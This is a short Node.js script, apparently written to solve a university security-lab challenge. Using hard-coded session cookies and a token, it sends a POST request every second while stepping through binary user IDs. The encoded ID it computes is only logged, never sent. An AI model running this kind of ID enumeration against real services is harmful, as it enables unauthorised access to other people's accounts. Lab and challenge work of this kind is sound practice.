
const sendHttps = require("./utils/sendHttps");
const base64 = require("base-64");
const utf8 = require("utf8");


const increseUserId = (str, i = 1) => {

    if (str[str.length - i] === '1') {
        str = str.substring(0, str.length - i) + '0' + str.substring(str.length - i, str.length - 1);
        str = increseUserId(str, i + 1);
    }
    else {
        str = str.substring(0, str.length - i) + '1' + str.substring(str.length - i, str.length - 1);
    }
    return str
}

const HackBase64 = () => {

    const options = {
        host: 'snickerboa.it.liu.se',
        path: '/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6',
        //This is what changes the request to a POST request
        method: 'POST',
        headers: {
            "Cookie": 'SubSessionID=TURBd01EQXdNREF3TURBd01EQXdNUT09; cc_cookie={"level":["necessary","analytics","vimeo"],"revision":0,"data":null,"rfc_cookie":false}; JSESSIONID=7C973704D4B1EE7D89E1FF3A1C43F176; token=-126619520866104753866201586754676957019',
            "Referer": "https://snickerboa.it.liu.se/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00c.jsp",
            "Origin": "https://snickerboa.it.liu.se",
            "Content-Type": "application/x-www-form-urlencoded"

        }
    }



    var userId = "0000000000000000";
    
    setInterval(() => {
    
        var bytes = utf8.encode(userId);
        var encodedOnce = base64.encode(bytes);
        var encodedTwice = base64.encode(encodedOnce);
        console.log(`${userId} = ${encodedTwice}`);
        userId = increseUserId(userId);
        sendHttps(`userId=${userId}&useSecurity=true`,options,(res) => {
            console.log(res);
        })
    }, 1000);




};

module.exports = HackBase64;